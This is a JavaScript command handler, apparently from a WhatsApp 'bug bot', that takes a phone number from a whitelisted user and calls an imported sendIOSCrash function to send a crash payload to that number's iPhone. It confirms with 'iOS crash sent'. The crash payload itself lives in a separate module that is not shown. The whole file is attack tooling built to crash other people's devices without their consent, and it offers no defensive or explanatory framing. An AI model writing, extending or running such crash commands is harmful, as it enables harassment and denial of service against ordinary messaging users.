const { sendIOSCrash } = require('../lib/bugfunctions');
const {
  isWhitelisted,
  normalizeNumber,
  getText,
  getSender,
  toJid
} = require('../Utils/helper');

async function ioscrashCommand(sock, chatId, message) {
  try {
    if (chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: '❌ Private only command'
      }, { quoted: message });
    }

    const text = getText(message);
    const args = text.trim().split(/\s+/);

    const sender = getSender(message);

    if (!isWhitelisted(sender)) {
      return sock.sendMessage(chatId, {
        text: '❌ Not whitelisted'
      }, { quoted: message });
    }

    let number = normalizeNumber(args[1]);

    if (!number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .ioscrash 2547xxxxxxx'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `📱 Sending iOS crash to ${number}...`
    }, { quoted: message });

    await sendIOSCrash(sock, target);

    await sock.sendMessage(chatId, {
      text: `✅ iOS crash sent`
    }, { quoted: message });

  } catch (e) {
    console.error(e);
  }
}

module.exports = ioscrashCommand;
